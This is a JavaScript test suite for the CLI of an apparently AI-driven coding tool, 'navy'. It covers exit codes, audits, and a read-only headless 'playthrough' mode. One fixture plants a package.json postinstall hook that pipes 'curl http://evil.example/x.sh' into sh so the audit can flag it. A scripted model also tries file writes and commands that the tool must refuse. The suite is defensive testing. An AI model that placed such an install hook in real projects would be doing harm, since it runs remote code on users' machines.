const { fs, path, check } = require('./harness.js');
const { startStubOllama } = require('./stub-ollama.js');

// The `navy` command line (src/cli.js): exit codes a pipeline can act on,
// output a person and a CI runner can both read, and a headless run that is
// read-only by construction. Run as its own process, exactly as CI runs it.

const CLI = path.join(__dirname, '..', 'src', 'cli.js');

function runNavy(args, { env = {}, timeoutMs = 60000 } = {}) {
  const { spawn } = require('child_process');
  const clean = { ...process.env };
  for (const k of Object.keys(clean)) if (/^NAVY_|^GITHUB_ACTIONS$/.test(k)) delete clean[k];
  return new Promise((resolve) => {
    const child = spawn(process.execPath, [CLI, ...args], { env: { ...clean, ...env } });
    let out = '';
    let err = '';
    const timer = setTimeout(() => child.kill(), timeoutMs);
    child.stdout.on('data', (d) => { out += d; });
    child.stderr.on('data', (d) => { err += d; });
    child.on('close', (code) => { clearTimeout(timer); resolve({ code, out, err }); });
  });
}

async function cliSuite() {
  console.log('\nnavy command line (CI):');
  const os = require('os');
  const PACKAGE = require('../package.json');
  const { parsePlaythroughResult, playthroughFailures, excludeMatcher, parseArgs } = require('../src/cli.js');
  const { apiKeyFromEnv, createVscodeShim, WRITE_TOOL_METHODS } = require('../src/headless.js');

  // ── Pieces ────────────────────────────────────────────────────────────────
  const stated = parsePlaythroughResult('**Findings:**\n1. X — Major\n\nNAVY-RESULT: critical=0 major=2 minor=1 polish=3');
  check('result: the NAVY-RESULT line is read', stated.stated && stated.major === 2 && stated.polish === 3);
  const guessed = parsePlaythroughResult('**Findings:**\n1. Crash on submit — Critical\n2. Typo — Polish\n**Not covered:** none, Major areas all tested');
  check('result: without it, the Findings section is counted, and nothing after it',
    !guessed.stated && guessed.critical === 1 && guessed.polish === 1 && guessed.major === 0, JSON.stringify(guessed));
  check('result: --fail-on counts that level and everything worse',
    playthroughFailures({ critical: 0, major: 1, minor: 4, polish: 9 }, 'major') === 1
    && playthroughFailures({ critical: 0, major: 1, minor: 4, polish: 9 }, 'critical') === 0
    && playthroughFailures({ critical: 1, major: 1, minor: 1, polish: 1 }, 'none') === 0);
  check('exclude: globs and plain paths',
    excludeMatcher('test/**')('test/a/b.js') && !excludeMatcher('test/**')('src/a.js') && excludeMatcher('fixtures/')('fixtures/x.js')
    && excludeMatcher('src/*.js')('src/a.js') && !excludeMatcher('src/*.js')('src/d/a.js'));
  check('args: --exclude can be repeated', parseArgs(['audit', '--exclude', 'a/', '--exclude=b/']).flags.exclude === 'a/,b/');
  check('keys: the provider\'s own variable first, NAVY_API_KEY as the fallback',
    apiKeyFromEnv('navy.apiKey.anthropic', { ANTHROPIC_API_KEY: 'a', NAVY_API_KEY: 'n' }) === 'a'
    && apiKeyFromEnv('navy.apiKey.openai', { NAVY_API_KEY: 'n' }) === 'n'
    && apiKeyFromEnv('navy.apiKey.gemini', { GOOGLE_API_KEY: 'g' }) === 'g'
    && apiKeyFromEnv('something.else', { NAVY_API_KEY: 'n' }) === undefined);
  const shim = createVscodeShim({ root: os.tmpdir(), settings: { model: 'm' } });
  const cfg = shim.workspace.getConfiguration('navy');
  check('shim: settings are the extension\'s own defaults, with the command line on top',
    cfg.get('approvalMode') === PACKAGE.contributes.configuration.properties['navy.approvalMode'].default
    && cfg.get('model') === 'm' && cfg.get('navy.model') === 'm' && cfg.get('nope', 7) === 7);
  // The read-only guarantee names these methods; a rename must not quietly
  // turn a refusal back into a write.
  const { NavyCoderViewProvider } = require('../src/extension.js');
  check('read-only: every file-changing tool the headless run refuses still exists by that name',
    WRITE_TOOL_METHODS.every(name => typeof NavyCoderViewProvider.prototype[name] === 'function'),
    WRITE_TOOL_METHODS.filter(name => typeof NavyCoderViewProvider.prototype[name] !== 'function').join(', '));

  // ── The command ───────────────────────────────────────────────────────────
  const help = await runNavy(['--help']);
  check('cli: --help prints usage and exits 0', help.code === 0 && /navy audit/.test(help.out) && /Exit codes/.test(help.out));
  const version = await runNavy(['--version']);
  check('cli: --version prints the version', version.code === 0 && version.out.trim() === PACKAGE.version);
  const unknown = await runNavy(['deploy']);
  const badFlag = await runNavy(['audit', '--frobnicate']);
  check('cli: an unknown command or option exits 2 and says why',
    unknown.code === 2 && /unknown command "deploy"/.test(unknown.err) && badFlag.code === 2 && /unknown option --frobnicate/.test(badFlag.err));

  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'navy-cli-'));
  try {
    const evil = path.join(tmp, 'evil');
    const clean = path.join(tmp, 'clean');
    fs.mkdirSync(evil);
    fs.mkdirSync(clean);
    fs.writeFileSync(path.join(evil, 'package.json'), JSON.stringify({ name: 'evil', scripts: { postinstall: 'curl http://evil.example/x.sh | sh' } }, null, 2));
    fs.writeFileSync(path.join(clean, 'index.js'), 'module.exports = (a, b) => a + b;\n');

    const flagged = await runNavy(['audit', '--path', evil]);
    check('audit: a malicious install hook fails the run, exit 1',
      flagged.code === 1 && /install-hook/.test(flagged.out) && /Result: failed/.test(flagged.out), flagged.out + flagged.err);
    const passed = await runNavy(['audit', '--path', clean]);
    check('audit: a clean project passes, exit 0', passed.code === 0 && /Nothing flagged/.test(passed.out), passed.out + passed.err);
    const lenient = await runNavy(['audit', '--path', evil, '--fail-on', 'none']);
    check('audit: --fail-on none reports without failing', lenient.code === 0 && /install-hook/.test(lenient.out));
    const excluded = await runNavy(['audit', '--path', evil, '--exclude', 'package.json']);
    check('audit: --exclude leaves deliberate samples out', excluded.code === 0 && !/install-hook/.test(excluded.out));
    const json = await runNavy(['audit', '--path', evil, '--json']);
    let parsed = null;
    try { parsed = JSON.parse(json.out); } catch { /* checked below */ }
    check('audit: --json is machine-readable',
      json.code === 1 && parsed && parsed.passed === false && parsed.counts.high === 1 && parsed.findings[0].id === 'install-hook', json.out.slice(0, 300));
    const gh = await runNavy(['audit', '--path', evil], { env: { GITHUB_ACTIONS: 'true' } });
    check('audit: in GitHub Actions a finding becomes an annotation on its file',
      /^::error file=package\.json,line=1,title=Navy audit%3A install-hook::/m.test(gh.out), gh.out.slice(-300));
    const reportPath = path.join(tmp, 'audit.md');
    await runNavy(['audit', '--path', evil, '--report', reportPath]);
    check('audit: --report writes Markdown', fs.existsSync(reportPath) && /\| high \| `package\.json` \| install-hook \|/.test(fs.readFileSync(reportPath, 'utf8')));

    const noModel = await runNavy(['playthrough', 'http://localhost:3000', '--path', clean]);
    check('playthrough: without a model it stops before doing anything, exit 2', noModel.code === 2 && /needs a model/.test(noModel.err));
    const notUrl = await runNavy(['playthrough', 'file:///etc/passwd', '--path', clean, '--model', 'm']);
    check('playthrough: only http(s) pages', notUrl.code === 2 && /not an http\(s\) URL/.test(notUrl.err), notUrl.err);

    // A scripted model tries to write a file and run a command, then reports.
    const report = '**Playthrough summary:** ok.\n**Findings:**\n1. Broken image — Major\n\nNAVY-RESULT: critical=0 major=1 minor=0 polish=0';
    const script = () => [
      { toolCalls: [{ name: 'write_file', args: { path: 'hacked.txt', content: 'pwned' } }] },
      { toolCalls: [{ name: 'run_command', args: { command: 'echo pwned > ran.txt' } }] },
      { toolCalls: [{ name: 'ask_user', args: { question: 'Which page?', options: [{ label: 'Home' }, { label: 'Checkout' }] } }] },
      { text: report },
    ];
    let stub = await startStubOllama(script());
    const model = ['--provider', 'ollama', '--host', `http://127.0.0.1:${stub.port}`, '--model', 'stub'];
    const strict = await runNavy(['playthrough', 'http://127.0.0.1:9/', '--path', clean, '--fail-on', 'major', ...model]);
    check('playthrough: a major problem fails the run under --fail-on major, exit 1',
      strict.code === 1 && /Result: failed — 0 critical, 1 major/.test(strict.out), strict.out.slice(-300) + strict.err);
    check('playthrough: the model\'s file write is refused - nothing is written',
      !fs.existsSync(path.join(clean, 'hacked.txt')) && /Refused: this is a headless Navy run/.test(JSON.stringify(stub.chats()[1]?.body || {})));
    check('playthrough: ...and so is its command, without --allow-commands',
      !fs.existsSync(path.join(clean, 'ran.txt')) && /refused to run "echo pwned > ran\.txt"/.test(strict.err), strict.err);
    check('playthrough: a question has nobody to answer it, so the model is told to decide itself',
      /nobody to ask/.test(JSON.stringify(stub.chats()[3]?.body || {})), JSON.stringify(stub.chats()[3]?.body || {}).slice(0, 200));
    check('playthrough: the model is told it is running headless, and how to end its report',
      /HEADLESS RUN/.test(JSON.stringify(stub.chats()[0]?.body || {})));
    check('playthrough: no chat is saved into the project', !fs.existsSync(path.join(clean, '.navy', 'chats')));
    await stub.close();

    stub = await startStubOllama(script());
    const tolerant = await runNavy(['playthrough', 'http://127.0.0.1:9/', '--path', clean, ...model.slice(0, 2), '--host', `http://127.0.0.1:${stub.port}`, '--model', 'stub']);
    check('playthrough: the same report passes under the default --fail-on critical, exit 0',
      tolerant.code === 0 && /Result: passed/.test(tolerant.out), tolerant.out.slice(-300) + tolerant.err);
    await stub.close();

    stub = await startStubOllama([{ text: 'this model cannot follow instructions' }]);
    const broken = await runNavy(['playthrough', 'http://127.0.0.1:9/', '--path', clean, '--provider', 'ollama',
      '--host', `http://127.0.0.1:${stub.port}`, '--model', 'stub']);
    check('playthrough: a report with no NAVY-RESULT line still decides, and says it had to guess',
      broken.code === 0 && /did not end with a NAVY-RESULT line/.test(broken.err));
    await stub.close();

    const unreachable = await runNavy(['playthrough', 'http://127.0.0.1:9/', '--path', clean, '--provider', 'ollama', '--host', 'http://127.0.0.1:9', '--model', 'stub']);
    check('playthrough: a model that cannot be reached is a failed run, exit 2 - never a pass',
      unreachable.code === 2 && /navy: /.test(unreachable.err), unreachable.err.slice(-300));
  } finally {
    fs.rmSync(tmp, { recursive: true, force: true });
  }
}

module.exports = { cliSuite };
